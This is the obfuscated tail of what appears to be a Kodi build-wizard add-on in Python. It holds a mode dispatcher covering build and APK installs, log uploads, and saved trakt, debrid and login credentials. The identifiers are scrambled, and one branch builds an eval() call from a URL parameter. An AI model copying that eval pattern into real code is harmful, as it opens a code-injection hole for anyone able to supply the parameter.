							os .unlink (os .path .join (O0OOOOOO0OO0O0O00 ,O0O00O0O00OO00O0O ))#line:5617
						for O0O0O000O0OO0O0OO in O00000O00OO0OO0O0 :#line:5618
							shutil .rmtree (os .path .join (O0OOOOOO0OO0O0O00 ,O0O0O000O0OO0O0OO ))#line:5619
					os .rmdir (O000O0O0O00O0O0OO )#line:5620
	except :pass #line:5622
params =get_params ()#line:5623
url =None #line:5624
name =None #line:5625
mode =None #line:5626
try :mode =urllib .unquote_plus (params ["mode"])#line:5628
except :pass #line:5629
try :name =urllib .unquote_plus (params ["name"])#line:5630
except :pass #line:5631
try :url =urllib .unquote_plus (params ["url"])#line:5632
except :pass #line:5633
wiz .log ('[ Version : \'%s\' ] [ Mode : \'%s\' ] [ Name : \'%s\' ] [ Url : \'%s\' ]'%(VERSION ,mode if not mode ==''else None ,name ,url ))#line:5635
wiz .log ("AAAAAAAAAAAAAAAAAAAAAAAAAA URL: %s"%mode )#line:5636
def setView (O0O0OOOO0OOOO00OO ,OOO00OOOO0O00O000 ):#line:5637
	if wiz .getS ('auto-view')=='true':#line:5638
		O00OO0000O000OO0O =wiz .getS (OOO00OOOO0O00O000 )#line:5639
		if O00OO0000O000OO0O =='50'and KODIV >=17 and SKIN =='skin.estuary':O00OO0000O000OO0O ='55'#line:5640
		if O00OO0000O000OO0O =='500'and KODIV >=17 and SKIN =='skin.estuary':O00OO0000O000OO0O ='50'#line:5641
		wiz .ebi ("Container.SetViewMode(%s)"%O00OO0000O000OO0O )#line:5642
if mode ==None :index ()#line:5644
elif mode =='wizardupdate':wiz .wizardUpdate ()#line:5646
elif mode =='builds':buildMenu ()#line:5647
elif mode =='viewbuild':viewBuild (name )#line:5648
elif mode =='buildinfo':buildInfo (name )#line:5649
elif mode =='buildpreview':buildVideo (name )#line:5650
elif mode =='install':buildWizard (name ,url )#line:5651
elif mode =='theme':buildWizard (name ,mode ,url )#line:5652
elif mode =='viewthirdparty':viewThirdList (name )#line:5653
elif mode =='installthird':thirdPartyInstall (name ,url )#line:5654
elif mode =='editthird':editThirdParty (name );wiz .refresh ()#line:5655
elif mode =='maint':maintMenu (name )#line:5657
elif mode =='passpin':passandpin ()#line:5658
elif mode =='backmyupbuild':backmyupbuild ()#line:5659
elif mode =='kodi17fix':wiz .kodi17Fix ()#line:5660
elif mode =='kodi177fix':wiz .kodi177Fix ()#line:5661
elif mode =='advancedsetting':advancedWindow (name )#line:5662
elif mode =='autoadvanced':showAutoAdvanced ();wiz .refresh ()#line:5663
elif mode =='removeadvanced':removeAdvanced ();wiz .refresh ()#line:5664
elif mode =='asciicheck':wiz .asciiCheck ()#line:5665
elif mode =='backupbuild':wiz .backUpOptions ('build')#line:5666
elif mode =='backupgui':wiz .backUpOptions ('guifix')#line:5667
elif mode =='backuptheme':wiz .backUpOptions ('theme')#line:5668
elif mode =='backupaddon':wiz .backUpOptions ('addondata')#line:5669
elif mode =='oldThumbs':wiz .oldThumbs ()#line:5670
elif mode =='clearbackup':wiz .cleanupBackup ()#line:5671
elif mode =='convertpath':wiz .convertSpecial (HOME )#line:5672
elif mode =='currentsettings':viewAdvanced ()#line:5673
elif mode =='fullclean':totalClean ();wiz .refresh ()#line:5674
elif mode =='clearcache':clearCache ();wiz .refresh ()#line:5675
elif mode =='fixwizard':fixwizard ();wiz .refresh ()#line:5676
elif mode =='fixskin':backtokodi ()#line:5677
elif mode =='testcommand':testcommand ()#line:5678
elif mode =='logsend':logsend ()#line:5679
elif mode =='rdon':rdon ()#line:5680
elif mode =='rdoff':rdoff ()#line:5681
elif mode =='setrd':setrealdebrid ()#line:5682
elif mode =='setrd2':setautorealdebrid ()#line:5683
elif mode =='clearpackages':wiz .clearPackages ();wiz .refresh ()#line:5684
elif mode =='clearcrash':wiz .clearCrash ();wiz .refresh ()#line:5685
elif mode =='clearthumb':clearThumb ();wiz .refresh ()#line:5686
elif mode =='checksources':wiz .checkSources ();wiz .refresh ()#line:5687
elif mode =='checkrepos':wiz .checkRepos ();wiz .refresh ()#line:5688
elif mode =='freshstart':freshStart ()#line:5689
elif mode =='forceupdate':wiz .forceUpdate ()#line:5690
elif mode =='forceprofile':wiz .reloadProfile (wiz .getInfo ('System.ProfileName'))#line:5691
elif mode =='forceclose':wiz .killxbmc ()#line:5692
elif mode =='forceskin':wiz .ebi ("ReloadSkin()");wiz .refresh ()#line:5693
elif mode =='hidepassword':wiz .hidePassword ()#line:5694
elif mode =='unhidepassword':wiz .unhidePassword ()#line:5695
elif mode =='enableaddons':enableAddons ()#line:5696
elif mode =='toggleaddon':wiz .toggleAddon (name ,url );wiz .refresh ()#line:5697
elif mode =='togglecache':toggleCache (name );wiz .refresh ()#line:5698
elif mode =='toggleadult':wiz .toggleAdult ();wiz .refresh ()#line:5699
elif mode =='changefeq':changeFeq ();wiz .refresh ()#line:5700
elif mode =='uploadlog':uploadLog .Main ()#line:5701
elif mode =='viewlog':LogViewer ()#line:5702
elif mode =='viewwizlog':LogViewer (WIZLOG )#line:5703
elif mode =='viewerrorlog':errorChecking (all =True )#line:5704
elif mode =='clearwizlog':f =open (WIZLOG ,'w');f .close ();wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Wizard Log Cleared![/COLOR]"%COLOR2 )#line:5705
elif mode =='purgedb':purgeDb ()#line:5706
elif mode =='fixaddonupdate':fixUpdate ()#line:5707
elif mode =='removeaddons':removeAddonMenu ()#line:5708
elif mode =='removeaddon':removeAddon (name )#line:5709
elif mode =='removeaddondata':removeAddonDataMenu ()#line:5710
elif mode =='removedata':removeAddonData (name )#line:5711
elif mode =='resetaddon':total =wiz .cleanHouse (ADDONDATA ,ignore =True );wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Addon_Data reset[/COLOR]"%COLOR2 )#line:5712
elif mode =='systeminfo':systemInfo ()#line:5713
elif mode =='restorezip':restoreit ('build')#line:5714
elif mode =='restoregui':restoreit ('gui')#line:5715
elif mode =='restoreaddon':restoreit ('addondata')#line:5716
elif mode =='restoreextzip':restoreextit ('build')#line:5717
elif mode =='restoreextgui':restoreextit ('gui')#line:5718
elif mode =='restoreextaddon':restoreextit ('addondata')#line:5719
elif mode =='writeadvanced':writeAdvanced (name ,url )#line:5720
elif mode =='traktsync':traktsync ()#line:5721
elif mode =='apk':apkMenu (name )#line:5723
elif mode =='apkscrape':apkScraper (name )#line:5724
elif mode =='apkinstall':apkInstaller (name ,url )#line:5725
elif mode =='speed':speedMenu ()#line:5726
elif mode =='net':net_tools ()#line:5727
elif mode =='GetList':GetList (url )#line:5728
elif mode =='youtube':youtubeMenu (name )#line:5729
elif mode =='viewVideo':playVideo (url )#line:5730
elif mode =='addons':addonMenu (name )#line:5732
elif mode =='addoninstall':addonInstaller (name ,url )#line:5733
elif mode =='savedata':saveMenu ()#line:5735
elif mode =='togglesetting':wiz .setS (name ,'false'if wiz .getS (name )=='true'else 'true');wiz .refresh ()#line:5736
elif mode =='managedata':manageSaveData (name )#line:5737
elif mode =='whitelist':wiz .whiteList (name )#line:5738
elif mode =='trakt':traktMenu ()#line:5740
elif mode =='savetrakt':traktit .traktIt ('update',name )#line:5741
elif mode =='restoretrakt':traktit .traktIt ('restore',name )#line:5742
elif mode =='addontrakt':traktit .traktIt ('clearaddon',name )#line:5743
elif mode =='cleartrakt':traktit .clearSaved (name )#line:5744
elif mode =='authtrakt':traktit .activateTrakt (name );wiz .refresh ()#line:5745
elif mode =='updatetrakt':traktit .autoUpdate ('all')#line:5746
elif mode =='importtrakt':traktit .importlist (name );wiz .refresh ()#line:5747
elif mode =='realdebrid':realMenu ()#line:5749
elif mode =='savedebrid':debridit .debridIt ('update',name )#line:5750
elif mode =='restoredebrid':debridit .debridIt ('restore',name )#line:5751
elif mode =='addondebrid':debridit .debridIt ('clearaddon',name )#line:5752
elif mode =='cleardebrid':debridit .clearSaved (name )#line:5753
elif mode =='authdebrid':debridit .activateDebrid (name );wiz .refresh ()#line:5754
elif mode =='updatedebrid':debridit .autoUpdate ('all')#line:5755
elif mode =='importdebrid':debridit .importlist (name );wiz .refresh ()#line:5756
elif mode =='login':loginMenu ()#line:5758
elif mode =='savelogin':loginit .loginIt ('update',name )#line:5759
elif mode =='restorelogin':loginit .loginIt ('restore',name )#line:5760
elif mode =='addonlogin':loginit .loginIt ('clearaddon',name )#line:5761
elif mode =='clearlogin':loginit .clearSaved (name )#line:5762
elif mode =='authlogin':loginit .activateLogin (name );wiz .refresh ()#line:5763
elif mode =='updatelogin':loginit .autoUpdate ('all')#line:5764
elif mode =='importlogin':loginit .importlist (name );wiz .refresh ()#line:5765
elif mode =='contact':notify .contact (CONTACT )#line:5767
elif mode =='settings':wiz .openS (name );wiz .refresh ()#line:5768
elif mode =='opensettings':id =eval (url .upper ()+'ID')[name ]['plugin'];addonid =wiz .addonId (id );addonid .openSettings ();wiz .refresh ()#line:5769
elif mode =='developer':developer ()#line:5771
elif mode =='converttext':wiz .convertText ()#line:5772
elif mode =='createqr':wiz .createQR ()#line:5773
elif mode =='testnotify':testnotify ()#line:5774
elif mode =='testnotify2':testnotify2 ()#line:5775
elif mode =='servicemanual':servicemanual ()#line:5776
elif mode =='fastinstall':fastinstall ()#line:5777
elif mode =='testupdate':testupdate ()#line:5778
elif mode =='testfirst':testfirst ()#line:5779
elif mode =='testfirstrun':testfirstRun ()#line:5780
elif mode =='testapk':notify .apkInstaller ('SPMC')#line:5781
elif mode =='bg':wiz .bg_install (name ,url )#line:5783
elif mode =='bgcustom':wiz .bg_custom ()#line:5784
elif mode =='bgremove':wiz .bg_remove ()#line:5785
elif mode =='bgdefault':wiz .bg_default ()#line:5786
elif mode =='rdset':rdsetup ()#line:5787
elif mode =='mor':morsetup ()#line:5788
elif mode =='mor2':morsetup2 ()#line:5789
elif mode =='resolveurl':resolveurlsetup ()#line:5790
elif mode =='urlresolver':urlresolversetup ()#line:5791
elif mode =='forcefastupdate':forcefastupdate ()#line:5792
elif mode =='traktset':traktsetup ()#line:5793
elif mode =='placentaset':placentasetup ()#line:5794
elif mode =='flixnetset':flixnetsetup ()#line:5795
elif mode =='reptiliaset':reptiliasetup ()#line:5796
elif mode =='yodasset':yodasetup ()#line:5797
elif mode =='numbersset':numberssetup ()#line:5798
elif mode =='uranusset':uranussetup ()#line:5799
elif mode =='genesisset':genesissetup ()#line:5800
elif mode =='fastupdate':fastupdate ()#line:5801
elif mode =='folderback':folderback ()#line:5802
elif mode =='menudata':Menu ()#line:5803
elif mode =='infoupdate':infobuild ()#line:5804
elif mode ==2 :#line:5806
        wiz .torent_menu ()#line:5807
elif mode ==3 :#line:5808
        wiz .popcorn_menu ()#line:5809
elif mode ==8 :#line:5810
        wiz .metaliq_fix ()#line:5811
elif mode ==9 :#line:5812
        wiz .quasar_menu ()#line:5813
elif mode ==5 :#line:5814
        swapSkins ('skin.Premium.mod')#line:5815
elif mode ==13 :#line:5816
        wiz .elementum_menu ()#line:5817
elif mode ==16 :#line:5818
        wiz .fix_wizard ()#line:5819
elif mode ==17 :#line:5820
        wiz .last_play ()#line:5821
elif mode ==18 :#line:5822
        wiz .normal_metalliq ()#line:5823
elif mode ==19 :#line:5824
        wiz .fast_metalliq ()#line:5825
elif mode ==20 :#line:5826
        wiz .fix_buffer2 ()#line:5827
elif mode ==21 :#line:5828
        wiz .fix_buffer3 ()#line:5829
elif mode ==11 :#line:5830
        wiz .fix_buffer ()#line:5831
elif mode ==15 :#line:5832
        wiz .fix_font ()#line:5833
elif mode ==14 :#line:5834
        wiz .clean_pass ()#line:5835
elif mode ==22 :#line:5836
        wiz .movie_update ()#line:5837
elif mode =='adv_settings':buffer1 ()#line:5838
elif mode =='getpass':getpass ()#line:5839
elif mode =='setpass':setpass ()#line:5840
elif mode =='setuname':setuname ()#line:5841
elif mode =='passandUsername':passandUsername ()#line:5842
elif mode =='9':disply_hwr ()#line:5843
elif mode =='99':disply_hwr2 ()#line:5844
xbmcplugin .endOfDirectory (int (sys .argv [1 ]))